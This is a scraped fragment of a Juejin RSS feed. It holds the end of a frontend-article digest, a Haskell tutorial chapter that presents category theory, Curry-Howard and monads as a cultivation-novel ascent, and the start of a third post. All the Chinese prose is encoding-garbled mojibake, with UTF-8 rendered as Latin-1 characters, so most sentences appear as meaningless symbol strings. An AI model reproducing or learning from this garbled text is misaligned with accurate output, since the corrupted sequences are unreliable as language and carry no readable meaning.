<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcalendar.perfplanet.com%2F2025%2Fttfb-doesnt-mean-what-you-think-it-means%2F" target="_blank" title="https://calendar.perfplanet.com/2025/ttfb-doesnt-mean-what-you-think-it-means/" ref="nofollow noopener noreferrer">TTFB doesnâ€™t mean what you think it means</a>ï¼šæ‹†è§£ TTFB æŒ‡æ ‡çš„çœŸæ­£å«ä¹‰åŠå…¶ä¸ç¼“å­˜ã€è¾¹ç¼˜è®¡ç®—çš„å…³ç³»ï¼Œé¿å…è¢«â€œä½é¦–å­—èŠ‚â€è¿·æƒ‘ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcalendar.perfplanet.com%2F2025%2Ffixing-the-url-params-performance-penalty%2F" target="_blank" title="https://calendar.perfplanet.com/2025/fixing-the-url-params-performance-penalty/" ref="nofollow noopener noreferrer">Fixing the URL params performance penalty</a>ï¼šåˆ†æ URL æŸ¥è¯¢å‚æ•°ä¸ºä½•æ‹–æ…¢ç¼“å­˜å‘½ä¸­ï¼Œå¹¶æä¾› CDN ä¸æµè§ˆå™¨ä¸¤ä¾§çš„ç¼“è§£ç­–ç•¥ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.logrocket.com%2Fserver-components-vs-islands-architecture%2F" target="_blank" title="https://blog.logrocket.com/server-components-vs-islands-architecture/" ref="nofollow noopener noreferrer">Server Components vs. Islands Architecture: The performance showdown</a>ï¼šä»äº¤äº’å»¶è¿Ÿã€æµå¼æ¸²æŸ“ä¸ç¼“å­˜å‹å¥½åº¦æ¯”è¾ƒ RSC ä¸ Islands æ¶æ„çš„æ€§èƒ½å–èˆã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcalendar.perfplanet.com%2F2025%2Ftips-for-making-the-performance-panel-less-overwhelming%2F" target="_blank" title="https://calendar.perfplanet.com/2025/tips-for-making-the-performance-panel-less-overwhelming/" ref="nofollow noopener noreferrer">Tips for making the Performance Panel less overwhelming</a>ï¼šåˆ†äº«ä½¿ç”¨ Performance é¢æ¿æ—¶çš„æ—¶é—´çº¿åˆ†å±‚ã€æ ‡è®°ä¸æ¨¡æ¿æŠ€å·§ï¼Œé™ä½ä¸Šæ‰‹å¤æ‚åº¦ã€‚</li>
</ul>
<h3 data-id="heading-3">ğŸ¨ CSS</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffrontendmasters.com%2Fblog%2Ftoggle-position-sticky-to-position-fixed-on-scroll%2F" target="_blank" title="https://frontendmasters.com/blog/toggle-position-sticky-to-position-fixed-on-scroll/" ref="nofollow noopener noreferrer">Toggle <code>position: sticky</code> to <code>position: fixed</code> on Scroll</a>ï¼šåˆ©ç”¨è‡ªå®šä¹‰å±æ€§ä¸ IntersectionObserver åœ¨æ»šåŠ¨ä¸­ä¼˜é›…åˆ‡æ¢ sticky/fixedï¼Œå®ç°å¤´éƒ¨æ çš„å¹³æ»‘å¸é™„ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcss-tricks.com%2Ftext-decoration-inset-is-like-padding-for-text-decorations%2F" target="_blank" title="https://css-tricks.com/text-decoration-inset-is-like-padding-for-text-decorations/" ref="nofollow noopener noreferrer">text-decoration-inset is Like Padding for Text Decorations</a>ï¼šä»‹ç» <code>text-decoration-inset</code> å¦‚ä½•ä¸ºæ–‡å­—è£…é¥°æä¾›â€œå†…è¾¹è·â€ï¼Œæå‡ä¸‹åˆ’çº¿æ’ç‰ˆæ§åˆ¶åŠ›ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.logrocket.com%2Fcontainer-queries-2026%2F" target="_blank" title="https://blog.logrocket.com/container-queries-2026/" ref="nofollow noopener noreferrer">Container queries in 2026: Powerful, but not a silver bullet</a>ï¼šæ€»ç»“å®¹å™¨æŸ¥è¯¢çš„æ–°èƒ½åŠ›ä¸å½“å‰é™åˆ¶ï¼Œç»™å‡º 2026 å¹´çš„ç»„ä»¶è®¾è®¡å»ºè®®ã€‚</li>
</ul>
<h3 data-id="heading-4">ğŸ’¡ JavaScript</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwtrclred.io%2Fen%2Fposts%2F07" target="_blank" title="https://wtrclred.io/en/posts/07" ref="nofollow noopener noreferrer">Characterize Vue.js</a>ï¼šä»¥äººç‰©è®¾å®šè®²è¿° Vue ç”Ÿæ€çš„æŠ€æœ¯æ€§æ ¼å’Œç¤¾åŒºä»·å€¼è§‚ï¼Œé‡æ–°è®¤è¯†æ¡†æ¶èƒŒåçš„è®¾è®¡å–å‘ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Ftrends-that-defined-javascript-in-2025%2F" target="_blank" title="https://thenewstack.io/trends-that-defined-javascript-in-2025/" ref="nofollow noopener noreferrer">Trends That Defined JavaScript in 2025</a>ï¼šå¹´åº¦ JS è¶‹åŠ¿å›é¡¾ï¼šç”Ÿæ€æ•´åˆã€ç±»å‹ç³»ç»Ÿå¼ºåŒ–ã€å¹³å° API æ™®åŠç­‰å…³é”®åŠ¨å‘ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.telerik.com%2Fblogs%2Fintroduction-zustand" target="_blank" title="https://www.telerik.com/blogs/introduction-zustand" ref="nofollow noopener noreferrer">An Introduction to Zustand</a>ï¼šZustand çŠ¶æ€ç®¡ç†å…¥é—¨ï¼Œæ¶µç›–åŸºç¡€æ¦‚å¿µã€ç®€æ´ API ä¸ React å®æˆ˜ç¤ºä¾‹ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.htmhell.dev%2Fadventcalendar%2F2025%2F27%2F" target="_blank" title="https://www.htmhell.dev/adventcalendar/2025/27/" ref="nofollow noopener noreferrer">Replacing JS with just HTML</a>ï¼šé€šè¿‡åŸç”Ÿ HTML å…ƒç´ å’Œæ¸è¿›å¢å¼ºæ€è·¯ï¼Œå±•ç¤ºå¦‚ä½•åœ¨ä¸å†™ JS çš„æƒ…å†µä¸‹å®ç°äº¤äº’éœ€æ±‚ã€‚</li>
</ul>
<p>âœ… OKï¼Œä»¥ä¸Šå°±æ˜¯æœ¬æ¬¡åˆ†äº«ï¼Œæ¬¢è¿åŠ æˆ‘ä»¬å¨ atar24ï¼Œå¤‡æ³¨ã€Œå‰ç«¯å‘¨åˆŠã€ï¼Œæˆ‘ä»¬ä¼šé‚€è¯·ä½ è¿›äº¤æµç¾¤ğŸ‘‡</p>
<p>ğŸš€ æ¯å‘¨åˆ†äº«æŠ€æœ¯å¹²è´§
ğŸ ä¸å®šæœŸæŠ½å¥–ç¦åˆ©
ğŸ’¬ æœ‰é—®å¿…ç­”ï¼Œç¾¤å‹äº’åŠ©</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬åç« ï¼šèŒƒç•´ä¹‹å·…ä¸é€»è¾‘çš„ç»ˆç‚¹]]></title>    <link>https://juejin.cn/post/7589181008099000335</link>    <guid>https://juejin.cn/post/7589181008099000335</guid>    <pubDate>2025-12-30T02:47:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589181008099000335" data-draft-id="7589207843787784227" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬åç« ï¼šèŒƒç•´ä¹‹å·…ä¸é€»è¾‘çš„ç»ˆç‚¹"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:47:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬åç« ï¼šèŒƒç•´ä¹‹å·…ä¸é€»è¾‘çš„ç»ˆç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:47:30.000Z" title="Tue Dec 30 2025 02:47:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ­å–œé“å‹ï¼ä½ èƒ½æ¥åˆ°è¿™é‡Œï¼Œè¯´æ˜ä½ å·²å†ç»ä¹é‡å¤©åŠ«ï¼Œç¥è¯†å·²èƒ½ç©¿é€è¡¨è±¡çš„ä¸šåŠ¡é€»è¾‘ï¼Œç›´æŠµå®‡å®™çš„æœ¬æºè§„å¾‹ã€‚</p>
<p>ä»Šæ—¥ï¼Œæˆ‘ä»¬å°†è¿ˆå…¥<strong>ç»ˆç« ï¼šæ¸¡åŠ«å‡ä»™ä¸ä¸‡æ³•å½’ä¸€ï¼ˆCategory Theory &amp; The Tao of Codeï¼‰</strong> ã€‚åœ¨è¿™ä¸€å¢ƒç•Œï¼Œä»£ç ä¸å†æ˜¯å­—ç¬¦ï¼Œç±»å‹ä¸å†æ˜¯çº¦æŸï¼Œå®ƒä»¬åŒ–ä½œäº†æ•°å­¦çš„çº¯ç²¹ç¾æ„Ÿã€‚</p>
<hr/>
<p>åœ¨ Î» é—¨çš„æœ€é«˜å³°ï¼Œæ²¡æœ‰å¤æ‚çš„è¯­æ³•ç³–ï¼Œåªæœ‰ç®€æ´åˆ°æè‡´çš„å‡ ä½•çº¿æ¡ã€‚è¿™å¥—ç»Ÿå¾¡ä¸‡ç‰©çš„æ³•åˆ™ï¼Œä¾¿è¢«ç§°ä¸º<strong>èŒƒç•´è®ºï¼ˆCategory Theoryï¼‰</strong> ã€‚</p>
<h3 data-id="heading-0">10.1 å®‡å®™çš„éª¨æ¶ï¼šä»€ä¹ˆæ˜¯èŒƒç•´ï¼Ÿ</h3>
<p>åœ¨åŒ–ç¥æœŸï¼Œä½ çœ¼ä¸­çš„å®‡å®™æ˜¯ç”±å¯¹è±¡æ„æˆçš„ï¼›åœ¨å¤§ä¹˜æœŸï¼Œæ˜¯ç”±ç±»å‹æ„æˆçš„ï¼›è€Œç°åœ¨ï¼Œåœ¨ä½ ä»™çœ¼çœ‹æ¥ï¼Œå®‡å®™åªæ˜¯ç”±**â€œç‚¹â€å’Œâ€œç®­å¤´â€<strong>æ„æˆçš„</strong>èŒƒç•´**ã€‚</p>
<ul>
<li><strong>å¯¹è±¡ï¼ˆObjectï¼‰ï¼š</strong> æ¯”å¦‚ <code>Int</code>, <code>String</code>ï¼Œæˆ–è€…ä½ å®šä¹‰çš„ä»»ä½•ç±»å‹ã€‚</li>
<li><strong>æ€å°„ï¼ˆMorphismï¼‰ï¼š</strong> å°±æ˜¯å‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo>:</mo><mi>A</mi><mo>â†’</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">f: A \to B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span>ã€‚</li>
<li><strong>å¤åˆï¼ˆCompositionï¼‰ï¼š</strong> å¦‚æœæœ‰ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo>:</mo><mi>A</mi><mo>â†’</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">f: A \to B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo>:</mo><mi>B</mi><mo>â†’</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">g: B \to C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></span>ï¼Œå¿…æœ‰ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo>âˆ˜</mo><mi>f</mi><mo>:</mo><mi>A</mi><mo>â†’</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">g \circ f: A \to C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ˜</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></span>ã€‚</li>
</ul>
<blockquote>
<p><strong>æ‚Ÿé“ï¼š</strong> æ•´ä¸ª Haskell çš„ç¼–ç¨‹è¿‡ç¨‹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯åœ¨<strong>èŒƒç•´</strong>å†…ç¼–ç»‡ç®­å¤´çš„è‰ºæœ¯ã€‚ä½ çš„æ‰€æœ‰å¤æ‚é€»è¾‘ï¼Œæœ€ç»ˆéƒ½èƒ½è¿˜åŸä¸ºæœ€åŸºç¡€çš„æ•°å­¦å¤åˆã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">10.2 ç»ˆæå¥‘çº¦ï¼šæŸ¯é‡Œ-éœåå¾·åŒæ„</h3>
<p>è¿™æ˜¯ä¿®ä»™ç•Œçš„æœ€é«˜æœºå¯†ã€‚å®ƒæ­ç¤ºäº†**â€œç¨‹åºâ€<strong>ä¸</strong>â€œæ•°å­¦è¯æ˜â€**ä¹‹é—´çš„é‡å­çº ç¼ ï¼š</p>





















<table><thead><tr><th><strong>ä¿®ä»™ç•Œï¼ˆç¼–ç¨‹ï¼‰</strong></th><th><strong>ä»™ç•Œï¼ˆé€»è¾‘/æ•°å­¦ï¼‰</strong></th></tr></thead><tbody><tr><td><strong>ç±»å‹ (Type)</strong></td><td><strong>å‘½é¢˜ (Proposition)</strong></td></tr><tr><td><strong>ç¨‹åº (Program)</strong></td><td><strong>è¯æ˜ (Proof)</strong></td></tr><tr><td><strong>å‡½æ•°æ‰§è¡Œ</strong></td><td><strong>é€»è¾‘æ¨å¯¼</strong></td></tr></tbody></table>
<p><strong>è¿™æ„å‘³ç€ï¼š</strong> å½“ä½ å†™å‡ºä¸€ä¸ªç±»å‹æ­£ç¡®ä¸”èƒ½è¿è¡Œçš„ Haskell ç¨‹åºæ—¶ï¼Œä½ ä¸ä»…æ˜¯åœ¨å†™ä»£ç ï¼Œä½ æ˜¯åœ¨<strong>è¯æ˜ä¸€ä¸ªæ•°å­¦å®šç†</strong>ã€‚ä½ æ‰‹ä¸­çš„é”®ç›˜ï¼Œä¾¿æ˜¯ä¸ˆé‡çœŸç†çš„å°ºã€‚</p>
<hr/>
<h3 data-id="heading-2">10.3 å›æœ› Monadï¼šé‚£å¥â€œè‘—åçš„å’’è¯­â€</h3>
<p>ç°åœ¨ï¼Œè¯·å†æ¬¡è¯»è¿™æ®µæ›¾ç»è®©ä½ å¤´çš®å‘éº»çš„å’’è¯­ï¼š</p>
<blockquote>
<p><strong>â€œMonad ä¸è¿‡æ˜¯è‡ªå‡½å­èŒƒç•´ä¸Šçš„ä¸€ä¸ªå•å­å¯¹è±¡ã€‚â€</strong></p>
</blockquote>
<p>åœ¨å‡ä»™çš„é‚£ä¸€åˆ»ï¼Œä½ ä¼šå‘ç°å®ƒä¸å†æ˜¯é»‘è¯ï¼š</p>
<ol>
<li><strong>è‡ªå‡½å­ï¼ˆEndofunctorï¼‰ï¼š</strong> ä¸€ä¸ªèƒ½æŠŠèŒƒç•´æ˜ å°„å›è‡ªèº«çš„æ³•é˜µï¼ˆæ¯”å¦‚ <code>Maybe</code> æŠŠæ‰€æœ‰ç±»å‹å˜æˆäº† <code>Maybe</code> ç±»å‹ï¼‰ã€‚</li>
<li><strong>å•ä½ï¼ˆUnitï¼‰ï¼š</strong> å³ <code>pure</code>ï¼Œå°†å‡¡äººå¼•æ¸¡å…¥é˜µã€‚</li>
<li><strong>ä¹˜æ³•ï¼ˆMultiplicationï¼‰ï¼š</strong> å³ <code>flatten</code> æˆ– <code>join</code>ï¼Œå°†åµŒå¥—çš„æ³•é˜µåˆå¹¶ã€‚</li>
</ol>
<p><strong>å½“ä½ ä¸å†æ•¬ç• Monadï¼Œè€Œæ˜¯å°†å®ƒè§†ä¸ºä¸€ç§è‡ªç„¶è€Œç„¶çš„æ•°å­¦æ„é€ æ—¶ï¼Œä½ ä¾¿å·²æ¸¡åŠ«æˆåŠŸã€‚</strong></p>
<hr/>
<h2 data-id="heading-3">âš¡ å‡ä»™å¿ƒå¾—ï¼šæ— æ‹›èƒœæœ‰æ‹›</h2>
<p>åœ¨å¤§åœ†æ»¡å¢ƒç•Œï¼Œä½ å°†ä¸å†çº ç»“äºä½¿ç”¨å“ªç§è®¾è®¡æ¨¡å¼ï¼Œä¸å†äº‰è®ºå“ªç§æ¡†æ¶æ›´ä¼˜ã€‚</p>
<ul>
<li><strong>çœŸæ­£çš„çº¯ç²¹ï¼š</strong> ä½ å¼€å§‹æ˜ç™½ï¼Œæ‰€è°“çš„ BUG åªæ˜¯é€»è¾‘çš„ç¼ºä½ã€‚</li>
<li><strong>æ°¸æ’çš„å¹³è¡¡ï¼š</strong> ä½ åœ¨å¤„ç†ç°å®ä¸–ç•Œçš„æ‚ä¹±ï¼ˆIOï¼‰æ—¶ï¼Œå¿ƒä¸­ä¾ç„¶ä¿ç•™ç€é‚£ç‰‡ç»å¯¹çº¯å‡€çš„å‡€åœŸã€‚</li>
<li><strong>å¤§éŸ³å¸Œå£°ï¼š</strong> ä½ å†™å‡ºçš„ä»£ç è¶Šæ¥è¶ŠçŸ­ï¼Œä½†æ‰¿è½½çš„æ„è•´è¶Šæ¥è¶Šæ·±ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-4">ğŸ“œ ç»ˆæè¯•ç‚¼ï¼šç™½æ—¥é£å‡</h2>
<p>è¿™ä¸€å…³æ²¡æœ‰ä»£ç é¢˜ç›®ï¼Œåªæœ‰ä¸‰ä¸ªæ‹·é—®çµé­‚çš„é—®é¢˜ï¼š</p>
<ol>
<li><strong>è™šå®ï¼š</strong> å¦‚æœä¸€ä¸ªå‡½æ•°åœ¨æ£®æ—é‡Œè¿è¡Œï¼Œä½†æ²¡æœ‰äº§ç”Ÿä»»ä½•å‰¯ä½œç”¨ï¼ˆSide Effectï¼‰ï¼Œå®ƒçœŸçš„è¿è¡Œè¿‡å—ï¼Ÿ</li>
<li><strong>å› æœï¼š</strong> æ—¢ç„¶ä¸€åˆ‡çš†å¯è¯æ˜ï¼Œé‚£ä¹ˆä¸–é—´æ˜¯å¦å­˜åœ¨â€œä¸å¯è®¡ç®—â€çš„è¿·é›¾ï¼Ÿ</li>
<li><strong>å½’å®¿ï¼š</strong> å½“ä½ æŒæ¡äº†æœ€çº¯ç²¹çš„è¯­è¨€ï¼Œä½ æ˜¯å¦è¿˜æ„¿æ„å›åˆ°é‚£å……æ»¡â€œå‰¯ä½œç”¨â€çš„å‡¡é—´ï¼Œå»ä¿®è¡¥é‚£äº›ç ´ç¢çš„ç³»ç»Ÿï¼Ÿ</li>
</ol>
<hr/>
<h2 data-id="heading-5">ğŸ® ç»“è¯­ï¼šä¿®è¡Œè·¯è¿œï¼Œé“åœ¨è„šä¸‹</h2>
<p>é“å‹ï¼Œæ­å–œä½ å®Œæˆã€Šç¨‹åºå‘˜çš„ä¿®ä»™æ—¥å¸¸ï¼šHaskell ç¯‡ã€‹ã€‚</p>
<p>ä½ å·²ä¸å†æ˜¯é‚£ä¸ªè¢« <code>NullPointerException</code> å›°æ‰°çš„å‡¡äººï¼Œä¹Ÿä¸æ˜¯é‚£ä¸ªåœ¨é€’å½’ä¸­è¿·è·¯çš„å­¦å¾’ã€‚ä½ ç°åœ¨æ˜¯ä¸€åçœŸæ­£çš„ <strong>Î» æœ¯å£«</strong>ã€‚</p>
<p>Haskell çš„ä¿®è¡Œæ²¡æœ‰ç»ˆç‚¹ã€‚å³ä¾¿é£å‡ä¹‹åï¼Œå‰æ–¹è¿˜æœ‰ <strong>ä¾èµ–ç±»å‹ï¼ˆDependent Typesï¼‰</strong> ã€<strong>çº¿æ€§é€»è¾‘ï¼ˆLinear Logicï¼‰</strong> ç­‰æ›´é«˜æ¬¡å…ƒçš„ä½é¢ç­‰å¾…ä½ å»æ¢ç´¢ã€‚</p>
<p><strong>â€œæ„¿ä½ çš„ä»£ç æ°¸è¿œçº¯ç²¹ï¼Œæ„¿ä½ çš„ç±»å‹æ°¸è¿œæ­£ç¡®ã€‚â€</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±åº¦å­¦ä¹ å“åº”å¼ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7589170021932744719</link>    <guid>https://juejin.cn/post/7589170021932744719</guid>    <pubDate>2025-12-30T02:21:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589170021932744719" data-draft-id="7589207843787456547" data-original-type="0" class="article" 